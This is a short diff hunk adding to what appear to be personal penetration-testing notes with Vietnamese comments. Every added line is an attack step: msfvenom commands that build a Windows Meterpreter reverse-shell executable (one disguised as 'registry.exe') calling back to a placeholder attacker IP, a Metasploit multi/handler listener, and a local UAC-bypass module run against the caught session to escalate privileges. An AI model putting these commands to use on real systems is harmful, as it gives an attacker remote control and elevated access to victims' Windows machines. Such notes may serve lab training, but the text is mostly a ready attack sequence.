@@ -199,6 +199,22 @@ set session 2 											( chọn session nào là system)
 -----------------------------------------------------------------------------------------------------------------
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=<ipattacker> lport=444 -f exe > /home/attacker/Desktop/Test.exe
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ipattacker> lport=4444 -f exe > /home/attacker/Desktop/registry.exe
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ipattacker>
+set LPORT 4444
+run
+
+(win run Test.exe)
+
+background
+(hiện session hiện tại )
+use exploit/windows/local/bypassuac_silentcleanup
+set session 1 											(chọn session vừa hiện) 		
+
 
 
 
